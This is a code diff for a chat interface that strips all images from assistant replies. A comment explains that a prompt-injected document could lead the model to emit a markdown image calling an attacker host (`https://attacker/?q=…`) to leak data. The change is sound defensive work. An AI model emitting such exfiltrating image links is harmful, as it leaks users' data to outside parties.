@@ -79,15 +79,39 @@ function sanitize(content: unknown): string {
   return content.replace(DOC_HEADER, "").trim();
 }
 
+/* Replies never carry a legitimate image, and a remote one is fetched as soon
+ * as it renders: a prompt-injected document could make the model emit
+ * `![](https://attacker/?q=…)` and leak data. Streamdown merges `components`
+ * over its defaults, so this drops every image, raw HTML `<img>` included.
+ * The CSP in next.config.ts blocks remote images too. */
+const noImage = () => null;
+
+function ImagelessMarkdown(
+  props: ComponentProps<typeof CopilotChatAssistantMessage.MarkdownRenderer>,
+) {
+  return (
+    <CopilotChatAssistantMessage.MarkdownRenderer
+      {...props}
+      components={{ ...props.components, img: noImage }}
+    />
+  );
+}
+
 function FilteredAssistantMessageImpl(props: Props) {
   const original = props.message;
   const cleanedContent = sanitize(original.content);
   if (cleanedContent === original.content) {
-    return <CopilotChatAssistantMessage {...props} />;
+    return (
+      <CopilotChatAssistantMessage
+        {...props}
+        markdownRenderer={ImagelessMarkdown}
+      />
+    );
   }
   return (
     <CopilotChatAssistantMessage
       {...props}
+      markdownRenderer={ImagelessMarkdown}
       message={{ ...original, content: cleanedContent }}
     />
   );
